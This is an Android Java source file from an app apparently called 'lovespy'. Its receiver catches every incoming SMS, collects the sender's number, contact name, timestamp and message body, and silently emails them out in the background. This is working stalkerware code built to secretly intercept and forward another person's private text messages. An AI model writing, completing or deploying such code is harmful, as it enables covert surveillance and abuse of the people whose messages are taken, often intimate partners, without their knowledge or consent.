package com.example.lovespy.app.sms;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.SmsMessage;

import com.example.lovespy.app.email.EmailHelper;

public class SmsReceivedListener extends BroadcastReceiver {
    private Bundle mBundle;

    @Override
    public void onReceive(final Context context, Intent intent) {
        if(intent.getAction().equals("android.provider.Telephony.SMS_RECEIVED")){
            mBundle = intent.getExtras();
            new AsyncTask<String,Void,Void>() {
                @Override
                protected Void doInBackground(String... params) {
                    EmailHelper emailHelper = new EmailHelper(context);
                    String letter = params[0];
                    emailHelper.trySending(letter);
                    return null;
                }
            }.execute(getSmsDetails(context));
        }
    }

    private String getSmsDetails(Context context){
        String message = "";
        SmsMessage[] msgs;
        String address, body;
        Long time;
        if(mBundle != null) {
            try {
                Object[] pdus = (Object[]) mBundle.get("pdus");
                msgs = new SmsMessage[pdus.length];
                SmsHelper smsHelper = new SmsHelper(context);
                for (int i = 0; i < msgs.length; i++) {
                    msgs[i] = SmsMessage.createFromPdu((byte[])pdus[i]);
                    address = msgs[i].getOriginatingAddress();
                    body = msgs[i].getMessageBody();
                    time = msgs[i].getTimestampMillis();
                    if (i == 0) {
                        message += "Date: "+smsHelper.convertDate(time)+"\n";
                        message += "Type: "+smsHelper.INBOX+"\n";
                        message += "Number: "+address+"\n";
                        message += "Name: "+smsHelper.getContactName(address)+"\n";
                        if (msgs.length == 1) {
                            message += "Body: "+smsHelper.removeNewLine(body)+"\n";
                        } else {
                            message += "Body: "+smsHelper.removeNewLine(body)+" ";
                        }
                    } else {
                        message += smsHelper.removeNewLine(body)+" ";
                    }
                }
                if (msgs.length == 1) {
                    message += "_______________"+"\n";
                } else {
                    message += "\n"+"_______________"+"\n";
                }
            } catch (Exception e){
                e.printStackTrace();
            }
        }
        return message;
    }
}
